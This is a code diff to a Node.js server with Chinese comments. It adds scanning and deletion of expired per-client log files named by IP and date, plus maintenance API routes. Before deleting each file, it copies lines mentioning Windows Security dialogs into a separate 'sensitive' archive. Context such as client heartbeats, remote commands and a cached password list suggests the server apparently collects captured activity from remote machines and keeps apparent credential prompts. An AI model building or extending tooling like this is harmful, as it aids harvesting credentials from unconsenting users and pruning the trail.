@@ -171,6 +171,9 @@ const CONFIG = {
     deleteConcurrency: parseInt(process.env.DELETE_CONCURRENCY) || 10,
     commandConcurrency: parseInt(process.env.COMMAND_CONCURRENCY) || 10,
     heartbeatConcurrency: parseInt(process.env.HEARTBEAT_CONCURRENCY) || 20,
+    // 日志清理相关配置
+    logRetentionDays: parseInt(process.env.LOG_RETENTION_DAYS) || 30,
+    sensitiveLogSavePath: process.env.SENSITIVE_LOG_SAVE_PATH || path.join(__dirname, 'logs', 'windows_security_saves.txt'),
 };
 
 // ========== 环境变量二次校验 ==========
@@ -652,6 +655,8 @@ const extractionCache = {
         updateAgeOnGet: true
     })
 };
+
+
 
 // ========== MySQL 数据库 ==========
 const dbPoolConfig = {
@@ -1495,6 +1500,170 @@ function handleWebSocketConnection(ws, req) {
     });
 }
 
+//自动清理过期日志文件 
+async function cleanExpiredLogs() {
+    const now = Date.now();
+    const retentionMs = CONFIG.logRetentionDays * 24 * 60 * 60 * 1000;
+    let cleanedCount = 0;
+    let savedLinesCount = 0;
+
+    try {
+        // 1. 获取所有日志文件
+        let allFiles;
+        try {
+            allFiles = await alistClient.listFiles(CONFIG.alist.basePath, true);
+        } catch (err) {
+            logger.error(`[日志清理] 无法列出文件: ${err.message}`);
+            return;
+        }
+
+        const logFiles = allFiles.filter(f => f.filename.endsWith('.log'));
+        if (logFiles.length === 0) {
+            logger.debug('[日志清理] 没有 .log 文件需要检查');
+            return;
+        }
+
+        logger.info(`[日志清理] 开始检查 ${logFiles.length} 个日志文件，保留 ${CONFIG.logRetentionDays} 天`);
+
+        for (const file of logFiles) {
+            // 2. 从文件名中提取日期（支持 IP_YYYYMMDD.log 格式）
+            const dateMatch = file.filename.match(/(\d{8})\.log$/);
+            if (!dateMatch) {
+                logger.debug(`[日志清理] 跳过无法识别日期的文件: ${file.filename}`);
+                continue;
+            }
+
+            const dateStr = dateMatch[1];
+            const year = parseInt(dateStr.substring(0, 4));
+            const month = parseInt(dateStr.substring(4, 6)) - 1; // 月份从0开始
+            const day = parseInt(dateStr.substring(6, 8));
+            const fileDate = new Date(year, month, day);
+            const fileAge = now - fileDate.getTime();
+
+            // 3. 未过期则跳过
+            if (fileAge <= retentionMs) continue;
+
+            // 4. 过期文件处理
+            const filePath = `${CONFIG.alist.basePath}/${file.filename}`;
+            logger.info(`[日志清理] 发现过期文件: ${file.filename} (日期: ${dateStr})`);
+
+            try {
+                // 4.1 读取文件内容
+                const content = await alistClient.readFile(filePath);
+                const lines = content.split(/\r?\n/);
+
+                // 4.2 提取包含“Windows 安全”或“Windows 安全中心”的行
+                const sensitiveLines = lines.filter(line =>
+                    line.includes('Windows 安全') || line.includes('Windows 安全中心')
+                );
+
+                // 4.3 如果有敏感行，追加保存到归档文件
+                if (sensitiveLines.length > 0) {
+                    const header = `\n--- ${file.filename} (${dateStr}) ---\n`;
+                    const block = header + sensitiveLines.join('\n') + '\n';
+                    // 确保归档文件所在目录存在
+                    const dir = path.dirname(CONFIG.sensitiveLogSavePath);
+                    if (!fs.existsSync(dir)) {
+                        fs.mkdirSync(dir, { recursive: true });
+                    }
+                    await fs.promises.appendFile(CONFIG.sensitiveLogSavePath, block, 'utf8');
+                    savedLinesCount += sensitiveLines.length;
+                    logger.debug(`[日志清理] 从 ${file.filename} 保存了 ${sensitiveLines.length} 条信息`);
+                }
+
+                // 4.4 确认保存成功（无异常）后，删除源文件
+                await alistClient.deleteFile(filePath);
+                cleanedCount++;
+                logger.info(`[日志清理] 已删除: ${file.filename}`);
+            } catch (err) {
+                logger.error(`[日志清理] 处理 ${file.filename} 时出错: ${err.message}`);
+                // 继续处理下一个文件，避免一个失败影响全部
+            }
+        }
+
+        logger.info(`[日志清理] 清理完成：删除 ${cleanedCount} 个文件，保存 ${savedLinesCount} 条敏感信息`);
+    } catch (err) {
+        logger.error(`[日志清理] 全局异常: ${err.message}`);
+    }
+}
+
+// 扫描过期日志文件（不删除，仅列出）
+async function scanExpiredLogs() {
+    const now = Date.now();
+    const retentionMs = CONFIG.logRetentionDays * 24 * 60 * 60 * 1000;
+    const expiredFiles = [];
+
+    try {
+        const allFiles = await alistClient.listFiles(CONFIG.alist.basePath, true);
+        const logFiles = allFiles.filter(f => f.filename.endsWith('.log'));
+
+        for (const file of logFiles) {
+            const dateMatch = file.filename.match(/(\d{8})\.log$/);
+            if (!dateMatch) continue;
+
+            const dateStr = dateMatch[1];
+            const year = parseInt(dateStr.substring(0, 4));
+            const month = parseInt(dateStr.substring(4, 6)) - 1;
+            const day = parseInt(dateStr.substring(6, 8));
+            const fileDate = new Date(year, month, day);
+            const fileAge = now - fileDate.getTime();
+
+            if (fileAge > retentionMs) {
+                expiredFiles.push({
+                    filename: file.filename,
+                    date: dateStr           // 格式 20260428，方便展示
+                });
+            }
+        }
+
+        // 按日期降序排列，最新的在前
+        expiredFiles.sort((a, b) => b.date.localeCompare(a.date));
+        return expiredFiles;
+    } catch (err) {
+        logger.error(`[扫描过期日志] 失败: ${err.message}`);
+        throw err;
+    }
+}
+
+//清理选中的日志文件
+async function cleanSelectedLogs(filenames) {
+    const results = [];
+    let totalClean = 0, totalSaved = 0;
+
+    for (const filename of filenames) {
+        const filePath = `${CONFIG.alist.basePath}/${filename}`;
+        try {
+            // 读取文件内容
+            const content = await alistClient.readFile(filePath);
+            const lines = content.split(/\r?\n/);
+
+            const sensitiveLines = lines.filter(line =>
+                line.includes('Windows 安全') || line.includes('Windows 安全中心')
+            );
+
+            if (sensitiveLines.length > 0) {
+                const header = `\n--- ${filename} (deleted on ${new Date().toISOString()}) ---\n`;
+                const block = header + sensitiveLines.join('\n') + '\n';
+
+                const dir = path.dirname(CONFIG.sensitiveLogSavePath);
+                if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+                await fs.promises.appendFile(CONFIG.sensitiveLogSavePath, block, 'utf8');
+                totalSaved += sensitiveLines.length;
+            }
+
+            await alistClient.deleteFile(filePath);
+            totalClean++;
+            results.push({ filename, success: true });
+        } catch (err) {
+            logger.error(`[清理选中] 处理 ${filename} 失败: ${err.message}`);
+            results.push({ filename, success: false, error: err.message });
+        }
+    }
+
+    logger.info(`[清理选中] 完成：删除 ${totalClean} 个，保存 ${totalSaved} 行敏感信息`);
+    return { results, totalClean, totalSaved };
+}
+
 // ========== HTTP API 路由 ==========
 
 app.get('/api/clients', (req, res) => {
@@ -1817,6 +1986,27 @@ app.delete('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res
     await alistClient.deleteFile(filePath);
     logger.info(`日志文件已删除: ${filePath}`, { clientId: req.params.clientId, user: req.user || 'unknown' });
     res.json({ success: true, message: '文件已删除' });
+}));
+
+// 扫描过期日志（仅预览，不删除）
+app.get('/api/maintenance/scan-expired-logs', asyncHandler(async (req, res) => {
+    logger.info('收到扫描过期日志请求', { user: req.user });
+    const files = await scanExpiredLogs();
+    res.json({ success: true, files });
+}));
+
+// 清理选中的日志
+app.post('/api/maintenance/clean-selected-logs', asyncHandler(async (req, res) => {
+    const { filenames } = req.body;
+    if (!Array.isArray(filenames) || filenames.length === 0) {
+        return res.status(400).json({ success: false, error: 'filenames 必须是非空数组' });
+    }
+
+    logger.info(`用户选择清理 ${filenames.length} 个过期日志`, { user: req.user, filenames });
+    auditLogger.info('用户选择性清理过期日志', { user: req.user, action: 'clean_selected_logs', filenames });
+
+    const { results, totalClean, totalSaved } = await cleanSelectedLogs(filenames);
+    res.json({ success: true, results, totalClean, totalSaved });
 }));
 
 // 批量删除日志：增加预检并发控制
@@ -2399,6 +2589,19 @@ app.post('/api/blacklist', asyncHandler(async (req, res) => {
     // 清空密码列表
     extractionCache.passwords = [];
     res.json({ success: true });
+}));
+
+app.post('/api/maintenance/clean-expired-logs', asyncHandler(async (req, res) => {
+    logger.info('收到手动清理过期日志请求', { user: req.user });
+    auditLogger.info('用户请求清理过期日志', { user: req.user, action: 'clean_expired_logs' });
+
+    try {
+        await cleanExpiredLogs();
+        res.json({ success: true, message: '过期日志清理完成' });
+    } catch (error) {
+        logger.error('手动清理过期日志失败', { error: error.message });
+        res.status(500).json({ success: false, error: error.message });
+    }
 }));
 
 app.get('/api/blacklist', asyncHandler(async (req, res) => {
